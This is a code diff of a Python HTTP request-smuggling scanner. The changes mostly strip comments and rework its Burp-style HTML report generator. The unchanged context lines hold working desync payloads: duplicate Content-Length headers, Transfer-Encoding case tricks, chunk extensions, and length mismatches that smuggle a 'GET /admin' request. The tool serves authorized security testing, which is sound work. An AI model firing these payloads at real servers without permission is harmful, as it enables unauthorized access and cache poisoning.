@@ -1,14 +1,12 @@
 #!/usr/bin/python
 """
 HTTP Desync (Request Smuggling) Scanner - upgraded + advanced payloads + Burp-style interactive HTML report
-by nu11secur1ty 2025 (patched - interactive report)
+by nu11secur1ty 2025 (patched - HTML generator)
 
 Notes:
-- Legacy + expanded payloads + additional deep templates (chunk tricks, LF-only,
-  folded headers, Expect:100, pipelined requests, HTTP/1.0, absolute-URI, etc.)
+- Legacy + expanded payloads + additional deep templates
 - Supports --proxy (host:port). For HTTPS target with proxy the script uses CONNECT then TLS.
-- Safety: requires --auth-file containing the word 'AUTH' (unless you add an explicit bypass).
-- HTML report is a single standalone file (no external JS/CSS).
+- Safety: requires --auth-file containing the word 'AUTH'.
 """
 from __future__ import annotations
 import argparse
@@ -101,7 +99,6 @@ def payload_cl_te(host: str, path: str = "/") -> bytes:
 
 def payload_dup_cl_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     variants = []
-    # duplicate with zero / formatted zero
     l1 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -111,7 +108,6 @@ def payload_dup_cl_variants(host: str, path: str = "/") -> List[Tuple[str, bytes
         "",
     ]
     variants.append(("dup_cl_0_0000", join_lines(l1)))
-    # duplicate different values
     l2 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -121,7 +117,6 @@ def payload_dup_cl_variants(host: str, path: str = "/") -> List[Tuple[str, bytes
         "",
     ]
     variants.append(("dup_cl_4_1000", join_lines(l2)))
-    # many duplicates (three)
     l3 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -137,7 +132,6 @@ def payload_dup_cl_variants(host: str, path: str = "/") -> List[Tuple[str, bytes
 
 def payload_whitespace_case(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     variants = []
-    # trailing space
     lines1 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -146,7 +140,6 @@ def payload_whitespace_case(host: str, path: str = "/") -> List[Tuple[str, bytes
         "",
     ]
     variants.append(("ws_trailing_space", join_lines(lines1, b"hello")))
-    # mixed-case header
     lines2 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -155,7 +148,6 @@ def payload_whitespace_case(host: str, path: str = "/") -> List[Tuple[str, bytes
         "",
     ]
     variants.append(("te_lowercase", join_lines(lines2, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
-    # odd capitalization combo
     lines3 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -172,7 +164,6 @@ def payload_whitespace_case(host: str, path: str = "/") -> List[Tuple[str, bytes
 
 def payload_mixed_transfer(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     variants = []
-    # gzip, chunked combined
     lines = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -181,7 +172,6 @@ def payload_mixed_transfer(host: str, path: str = "/") -> List[Tuple[str, bytes]
         "",
     ]
     variants.append(("mix_te_gzip_chunked", join_lines(lines, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
-    # duplicate TE lines
     lines2 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -196,7 +186,6 @@ def payload_mixed_transfer(host: str, path: str = "/") -> List[Tuple[str, bytes]
 
 def payload_chunk_tricks(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     variants = []
-    # small chunk then poison
     lines = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -207,10 +196,8 @@ def payload_chunk_tricks(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     body = "1\r\nA\r\n0\r\n\r\n"
     poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
     variants.append(("small_chunk_poison", join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))))
-    # chunk extension
     body2 = "5;ext=1\r\nHELLO\r\n0\r\n\r\n"
     variants.append(("chunk_ext", join_lines(lines, body2.encode("utf-8") + poison.encode("utf-8"))))
-    # extra CRLFs around terminator
     body3 = "0" + CRLF + CRLF + CRLF
     variants.append(("extra_crlf_terminator", join_lines(lines, body3.encode("utf-8") + poison.encode("utf-8"))))
     return variants
@@ -218,7 +205,6 @@ def payload_chunk_tricks(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
 
 def payload_cl_mismatch(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     variants = []
-    # big content-length declared, small body + poison
     lines1 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -228,7 +214,6 @@ def payload_cl_mismatch(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     ]
     body_and_poison = b"A" * 4 + (f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}").encode("utf-8")
     variants.append(("cl_too_large_then_poison", join_lines(lines1, body_and_poison)))
-    # small content-length but long extra bytes
     lines2 = [
         f"POST {path} HTTP/1.1",
         f"Host: {host}",
@@ -476,10 +461,7 @@ def payload_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     templates.extend(payload_chunk_tricks(host, path))
     templates.extend(payload_cl_mismatch(host, path))
     templates.extend(payload_http2_to_http1_hints(host, path))
-    # append new deeper templates
     templates.extend(advanced_payloads(host, path))
-
-    # some small legacy extras
     extra = []
     extra.append(f"POST {path} HTTP/1.1")
     extra.append(f"Host: {host}")
@@ -612,18 +594,8 @@ def analyze_response(template_name: str, sent: bytes, resp_bytes: bytes, indicat
 
 
 # -----------------------
-# HTML report generator (Burp-style interactive, offline)
+# HTML report generator (Burp-style interactive, offline) -- FIXED
 # -----------------------
-def severity_badge_html(sev: str) -> str:
-    if sev == 'red':
-        color = '#b22222'; textcol = '#fff'
-    elif sev == 'yellow':
-        color = '#f39c12'; textcol = '#111'
-    else:
-        color = '#27ae60'; textcol = '#fff'
-    return f'<span style="display:inline-block;padding:6px 10px;border-radius:6px;background:{color};color:{textcol};font-weight:700;">{sev.upper()}</span>'
-
-
 def extract_request_meta(req_text: str) -> Tuple[str, str]:
     """Return (method, path) from request start-line, fallback to blanks."""
     try:
@@ -638,19 +610,15 @@ def extract_request_meta(req_text: str) -> Tuple[str, str]:
 
 def generate_html_report(report: Dict, html_path: str) -> None:
     """
-    Generates an interactive Burp-like HTML file:
-    - top search/filter bar (filter by template, method, path, severity, reason)
-    - per-result collapsible card with tabs: Request | Response | Analysis
-    - simple client-side syntax highlighting for headers & JSON
-    - copy and download buttons
+    Generates an interactive Burp-like HTML file and writes it atomically.
+    This version avoids f-string interpolation issues by using placeholders
+    and replacing them safely.
     """
     counts = {'red': 0, 'yellow': 0, 'green': 0}
     for r in report.get('results', []):
         sev = r.get('severity', 'green')
         counts[sev] = counts.get(sev, 0) + 1
 
-    # build a JSON-serializable representation for client-side filtering
-    # each item: id, template, method, path, severity, reasons, request, response, resp_len
     items = []
     idx = 0
     for r in report.get('results', []):
@@ -670,52 +638,57 @@ def generate_html_report(report: Dict, html_path: str) -> None:
             'resp_len': r.get('resp_len', 0),
         })
 
-    items_json = json.dumps(items).replace("</", "<\\/")  # small XSS-safe trick for embedding
+    items_json = json.dumps(items).replace("</", "<\\/")  # safe embed
 
-    html_doc = f"""<!doctype html>
+    # Prepare replacements
+    repl = {
+        "__ITEMS_JSON__": items_json,
+        "__TARGET__": html.escape(report.get('target', '')),
+        "__PORT__": str(report.get('port', '')),
+        "__PATH__": html.escape(report.get('path', '/')),
+        "__TIMESTAMP__": html.escape(time.ctime(report.get('timestamp', time.time()))),
+        "__COUNT_RED__": str(counts.get('red', 0)),
+        "__COUNT_YELLOW__": str(counts.get('yellow', 0)),
+        "__COUNT_GREEN__": str(counts.get('green', 0)),
+    }
+
+    # HTML template with placeholders (no Python f-string braces inside JS)
+    html_template = r"""<!doctype html>
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>HTTP Desync Scanner Report - {html.escape(report.get('target',''))}</title>
+  <title>HTTP Desync Scanner Report - __TARGET__</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    /* Lightweight Burp-like styling (light theme) */
-    :root {{
-      --bg: #f6f8fa;
-      --card: #ffffff;
-      --muted: #6b7280;
-      --accent: #2b6cb0;
-      --mono: Menlo,Monaco,Consolas,"Liberation Mono",monospace;
-    }}
-    body {{background:var(--bg);padding:18px;font-family:Inter,Segoe UI,Arial,Helvetica,sans-serif;color:#0b1220}}
-    .topcard {{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:14px}}
-    .card {{background:var(--card);border-radius:10px;padding:12px;box-shadow:0 6px 18px rgba(11,17,32,0.06)}}
-    .filters {{display:flex;gap:8px;align-items:center}}
-    input[type="text"], select {{padding:8px;border-radius:6px;border:1px solid #d1d5db}}
-    button.primary {{background:var(--accent);color:#fff;padding:8px 10px;border-radius:6px;border:none;cursor:pointer}}
-    .summary-item {{display:inline-block;padding:8px 10px;border-radius:8px;margin-right:8px;font-weight:700}}
-    .results {{margin-top:12px}}
-    .req-card {{margin:10px 0;padding:12px;border-radius:8px;}}
-    .req-card .head {{display:flex;justify-content:space-between;align-items:center;gap:12px}}
-    .req-card .meta {{font-size:13px;color:var(--muted)}}
-    .req-card .badge {{font-weight:700;padding:6px 10px;border-radius:6px}}
-    .panel {{margin-top:10px;display:none}}
-    pre {{font-family:var(--mono);font-size:13px;line-height:1.35}}
-    .tabbar {{display:flex;gap:8px;border-bottom:1px solid #eee;padding-bottom:8px;margin-bottom:8px}}
-    .tab {{padding:6px 10px;border-radius:6px;cursor:pointer;border:1px solid transparent}}
-    .tab.active {{background:#fff;border:1px solid #e5e7eb}}
-    .controls {{display:flex;gap:8px}}
-    .muted {{color:var(--muted)}}
-    .hidden {{display:none}}
-    .download-btn, .copy-btn {{padding:6px 8px;border-radius:6px;border:1px solid #ddd;background:#fff;cursor:pointer}}
-    .small {{font-size:12px;padding:4px 8px}}
-    /* severity colors */
-    .sev-red {{border-left:6px solid #b22222;background:#fff}}
-    .sev-yellow {{border-left:6px solid #f39c12;background:#fff}}
-    .sev-green {{border-left:6px solid #27ae60;background:#fff}}
-    .code-headers {{background:#0f1720;color:#e6eef6;padding:10px;border-radius:6px;overflow:auto;white-space:pre-wrap}}
-    .code-body {{background:#f7f8fa;color:#0b1220;padding:10px;border-radius:6px;overflow:auto;white-space:pre-wrap}}
-    .reason-pill {{display:inline-block;background:#f3f4f6;color:#111;padding:4px 8px;border-radius:6px;margin-right:6px;font-size:12px}}
+    :root { --bg: #f6f8fa; --card: #ffffff; --muted: #6b7280; --accent: #2b6cb0; --mono: Menlo,Monaco,Consolas,"Liberation Mono",monospace; }
+    body {background:var(--bg);padding:18px;font-family:Inter,Segoe UI,Arial,Helvetica,sans-serif;color:#0b1220}
+    .topcard {display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:14px}
+    .card {background:var(--card);border-radius:10px;padding:12px;box-shadow:0 6px 18px rgba(11,17,32,0.06)}
+    .filters {display:flex;gap:8px;align-items:center}
+    input[type="text"], select {padding:8px;border-radius:6px;border:1px solid #d1d5db}
+    button.primary {background:var(--accent);color:#fff;padding:8px 10px;border-radius:6px;border:none;cursor:pointer}
+    .summary-item {display:inline-block;padding:8px 10px;border-radius:8px;margin-right:8px;font-weight:700}
+    .results {margin-top:12px}
+    .req-card {margin:10px 0;padding:12px;border-radius:8px;}
+    .req-card .head {display:flex;justify-content:space-between;align-items:center;gap:12px}
+    .req-card .meta {font-size:13px;color:var(--muted)}
+    .req-card .badge {font-weight:700;padding:6px 10px;border-radius:6px}
+    .panel {margin-top:10px;display:none}
+    pre {font-family:var(--mono);font-size:13px;line-height:1.35}
+    .tabbar {display:flex;gap:8px;border-bottom:1px solid #eee;padding-bottom:8px;margin-bottom:8px}
+    .tab {padding:6px 10px;border-radius:6px;cursor:pointer;border:1px solid transparent}
+    .tab.active {background:#fff;border:1px solid #e5e7eb}
+    .controls {display:flex;gap:8px}
+    .muted {color:var(--muted)}
+    .hidden {display:none}
+    .download-btn, .copy-btn {padding:6px 8px;border-radius:6px;border:1px solid #ddd;background:#fff;cursor:pointer}
+    .small {font-size:12px;padding:4px 8px}
+    .sev-red {border-left:6px solid #b22222;background:#fff}
+    .sev-yellow {border-left:6px solid #f39c12;background:#fff}
+    .sev-green {border-left:6px solid #27ae60;background:#fff}
+    .code-headers {background:#0f1720;color:#e6eef6;padding:10px;border-radius:6px;overflow:auto;white-space:pre-wrap}
+    .code-body {background:#f7f8fa;color:#0b1220;padding:10px;border-radius:6px;overflow:auto;white-space:pre-wrap}
+    .reason-pill {display:inline-block;background:#f3f4f6;color:#111;padding:4px 8px;border-radius:6px;margin-right:6px;font-size:12px}
   </style>
 </head>
 <body>
@@ -724,12 +697,12 @@ def generate_html_report(report: Dict, html_path: str) -> None:
       <div style="display:flex;align-items:center;gap:12px">
         <div class="card">
           <div style="font-weight:800">HTTP Desync Scanner Report</div>
-          <div class="muted">Target: {html.escape(report.get('target',''))}:{report.get('port')}  Path: {html.escape(report.get('path','/'))}  Generated: {html.escape(time.ctime(report.get('timestamp', time.time())))}</div>
+          <div class="muted">Target: __TARGET__:__PORT__  Path: __PATH__  Generated: __TIMESTAMP__</div>
         </div>
         <div style="margin-left:8px">
-          <span class="summary-item" style="background:#fdecea;color:#a61e14">RED: {counts['red']}</span>
-          <span class="summary-item" style="background:#fff6e0;color:#8a6d00">YELLOW: {counts['yellow']}</span>
-          <span class="summary-item" style="background:#eafaf1;color:#086f39">GREEN: {counts['green']}</span>
+          <span class="summary-item" style="background:#fdecea;color:#a61e14">RED: __COUNT_RED__</span>
+          <span class="summary-item" style="background:#fff6e0;color:#8a6d00">YELLOW: __COUNT_YELLOW__</span>
+          <span class="summary-item" style="background:#eafaf1;color:#086f39">GREEN: __COUNT_GREEN__</span>
         </div>
       </div>
     </div>
@@ -753,38 +726,34 @@ def generate_html_report(report: Dict, html_path: str) -> None:
 
   <script>
     // Embedded items for client-side rendering & filtering
-    const ITEMS = {items_json};
+    const ITEMS = __ITEMS_JSON__;
 
-    function renderItems(list) {{
+    function renderItems(list) {
       const container = document.getElementById('results');
       container.innerHTML = '';
-      if (!list || list.length === 0) {{
+      if (!list || list.length === 0) {
         container.innerHTML = '<div class="card">No items match the filter.</div>';
         return;
-      }}
-      for (const it of list) {{
+      }
+      for (const it of list) {
         const id = it.id;
         const sevClass = it.severity === 'red' ? 'sev-red' : (it.severity === 'yellow' ? 'sev-yellow' : 'sev-green');
-        const reasonsHtml = (it.reasons || []).map(r => `<span class="reason-pill">${{escapeHtml(r)}}</span>`).join(' ');
-        // small safety: escape displayed text
+        const reasonsHtml = (it.reasons || []).map(r => `<span class="reason-pill">${escapeHtml(r)}</span>`).join(' ');
         const reqHtml = escapeHtml(it.request);
         const respHtml = escapeHtml(it.response);
-        // attempt nice formatting for body if JSON
-        let respBody = respHtml;
-        // create a short preview line:
-        const previewLine = it.response.split(/\\r?\\n/)[0] || '';
+        const previewLine = (it.response || '').split(/\r?\n/)[0] || '';
 
         const card = document.createElement('div');
-        card.className = `card req-card ${sevClass}`;
+        card.className = 'card req-card ' + sevClass;
         card.innerHTML = `
           <div class="head">
             <div>
-              <div style="font-weight:700">${{escapeHtml(it.template)}}</div>
-              <div class="meta">${{escapeHtml(it.method)}} &nbsp; <span style="font-weight:600">${{escapeHtml(it.path)}}</span> &nbsp; <span class="muted">${{escapeHtml(previewLine)}}</span></div>
+              <div style="font-weight:700">${escapeHtml(it.template)}</div>
+              <div class="meta">${escapeHtml(it.method)} &nbsp; <span style="font-weight:600">${escapeHtml(it.path)}</span> &nbsp; <span class="muted">${escapeHtml(previewLine)}</span></div>
             </div>
             <div class="controls">
               <div style="text-align:right;">
-                <div style="margin-bottom:6px">${{severityBadge(it.severity)}}</div>
+                <div style="margin-bottom:6px">${severityBadge(it.severity)}</div>
                 <div style="display:flex;gap:6px">
                   <button class="copy-btn small" onclick="copyText(${id}, 'request')">Copy Req</button>
                   <button class="copy-btn small" onclick="copyText(${id}, 'response')">Copy Resp</button>
@@ -810,33 +779,32 @@ def generate_html_report(report: Dict, html_path: str) -> None:
             </div>
             <div id="panel-${id}-analysis" class="panel">
               <div style="font-weight:700;margin-bottom:6px">Analysis</div>
-              <div>${{reasonsHtml}}</div>
-              <div style="margin-top:6px;color:#666;font-size:13px">Response length: ${{it.resp_len}}</div>
+              <div>${reasonsHtml}</div>
+              <div style="margin-top:6px;color:#666;font-size:13px">Response length: ${it.resp_len}</div>
             </div>
           </div>
         `;
         container.appendChild(card);
-      }}
-    }}
+      }
+    }
 
-    function severityBadge(sev) {{
+    function severityBadge(sev) {
       if (sev === 'red') return '<span style="display:inline-block;padding:6px 10px;border-radius:6px;background:#b22222;color:#fff;font-weight:700">HIGH</span>';
       if (sev === 'yellow') return '<span style="display:inline-block;padding:6px 10px;border-radius:6px;background:#f39c12;color:#111;font-weight:700">MED</span>';
       return '<span style="display:inline-block;padding:6px 10px;border-radius:6px;background:#27ae60;color:#fff;font-weight:700">LOW</span>';
-    }}
+    }
 
-    function escapeHtml(s) {{
+    function escapeHtml(s) {
       if (!s) return '';
       return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    }}
+    }
 
-    function applyFilters() {{
+    function applyFilters() {
       const q = (document.getElementById('q').value || '').toLowerCase().trim();
       const sev = (document.getElementById('sev').value || '').trim();
-      const filtered = ITEMS.filter(it => {{
+      const filtered = ITEMS.filter(it => {
         if (sev && it.severity !== sev) return false;
         if (!q) return true;
-        // search template, method, path, reasons, request, response
         if ((it.template || '').toLowerCase().includes(q)) return true;
         if ((it.method || '').toLowerCase().includes(q)) return true;
         if ((it.path || '').toLowerCase().includes(q)) return true;
@@ -844,37 +812,34 @@ def generate_html_report(report: Dict, html_path: str) -> None:
         if ((it.request || '').toLowerCase().includes(q)) return true;
         if ((it.response || '').toLowerCase().includes(q)) return true;
         return false;
-      }});
+      });
       renderItems(filtered);
-    }}
+    }
 
-    function resetFilters() {{
+    function resetFilters() {
       document.getElementById('q').value = '';
       document.getElementById('sev').value = '';
       renderItems(ITEMS);
-    }}
+    }
 
-    function openTab(id, tab) {{
+    function openTab(id, tab) {
       const panels = ['req','resp','analysis'];
-      panels.forEach(t => {{
+      panels.forEach(t => {
         const el = document.getElementById(`panel-${id}-${t}`);
         if (!el) return;
         el.style.display = (t === tab) ? 'block' : 'none';
-        // manage active class on tab elements: brute-force find parent card -> tabbar children
         const card = el.closest('.req-card');
-        if (card) {{
+        if (card) {
           const tabs = card.querySelectorAll('.tab');
-          tabs.forEach(tb => {{
-            tb.classList.remove('active');
-          }});
+          tabs.forEach(tb => { tb.classList.remove('active'); });
           const chosen = Array.from(card.querySelectorAll('.tab')).find(x => x.textContent.trim().toLowerCase().startsWith(tab));
           if (chosen) chosen.classList.add('active');
-        }}
-      }});
-    }}
+        }
+      });
+    }
 
-    function copyText(id, which) {{
-      try {{
+    function copyText(id, which) {
+      try {
         const el = document.getElementById(which === 'request' ? `req-${id}` : `resp-${id}`);
         if (!el) return alert('Not available');
         const ta = document.createElement('textarea');
@@ -884,39 +849,41 @@ def generate_html_report(report: Dict, html_path: str) -> None:
         document.execCommand('copy');
         document.body.removeChild(ta);
         alert('Copied to clipboard');
-      }} catch (e) {{
+      } catch (e) {
         alert('Copy error: ' + e);
-      }}
-    }}
+      }
+    }
 
-    function downloadText(id, which) {{
+    function downloadText(id, which) {
       const el = document.getElementById(which === 'request' ? `req-${id}` : `resp-${id}`);
       if (!el) return alert('Not available');
-      const blob = new Blob([el.textContent], {{type: 'text/plain'}});
+      const blob = new Blob([el.textContent], {type: 'text/plain'});
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = `${{which}}_${{id}}.txt`;
+      a.download = `${which}_${id}.txt`;
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
-    }}
+    }
 
-    // initial render
-    (function init() {{
+    (function init() {
       renderItems(ITEMS);
-    }})();
+    })();
   </script>
 </body>
 </html>
 """
 
+    # replace placeholders safely
+    for k, v in repl.items():
+        html_template = html_template.replace(k, v)
+
     try:
-        # write the file atomically
         tmp = html_path + ".tmp"
         with open(tmp, "w", encoding="utf-8") as fh:
-            fh.write(html_doc)
+            fh.write(html_template)
         os.replace(tmp, html_path)
         logger.info("HTML report written to %s", html_path)
     except Exception as e:
@@ -933,7 +900,6 @@ def scan_target(host: str, port: int, path: str, use_ssl: bool, concurrency: int
     def worker(name_raw: Tuple[str, bytes]) -> Dict:
         name, raw = name_raw
         status, resp = send_raw(host, port, raw, use_ssl=use_ssl, timeout=timeout, proxy=proxy)
-        # prepare default result structure
         base = {
             'template': name,
             'resp_len': 0,
@@ -948,7 +914,6 @@ def scan_target(host: str, port: int, path: str, use_ssl: bool, concurrency: int
             base.update({'error': resp.decode('utf-8', errors='replace')})
             return base
         analysis = analyze_response(name, raw, resp, indicators, large_threshold)
-        # attach raw request + full response to result for HTML export / analysis
         analysis['request_sent'] = raw.decode('latin-1', errors='replace')
         analysis['response_full'] = resp.decode('latin-1', errors='replace')
         return analysis
@@ -1037,24 +1002,22 @@ def main(argv: Optional[List[str]] = None) -> None:
     except Exception as e:
         logger.error("Failed to ensure output directory exists (%s): %s", out_dir, e)
 
-    # Write JSON report (always attempt — even if scan failed we write minimal report)
+    # Write JSON report
     try:
         with open(args.out, "w", encoding="utf-8") as fh:
             json.dump(report, fh, indent=2)
         logger.info("JSON report written to %s", args.out)
     except Exception as e:
         logger.error("Failed to write JSON report to %s: %s", args.out, e)
-        # fallback: print a compact JSON to stdout for troubleshooting
         try:
             print("FALLBACK JSON REPORT:", json.dumps(report, indent=2))
         except Exception:
             logger.error("Also failed to print fallback JSON report.")
 
-    # HTML output (optional) — try but do not crash if it fails
+    # HTML output
     if args.html:
         try:
             generate_html_report(report, args.html)
-            logger.info("HTML report written to %s", args.html)
         except Exception as e:
             logger.error("Failed to write HTML report: %s", e)
 
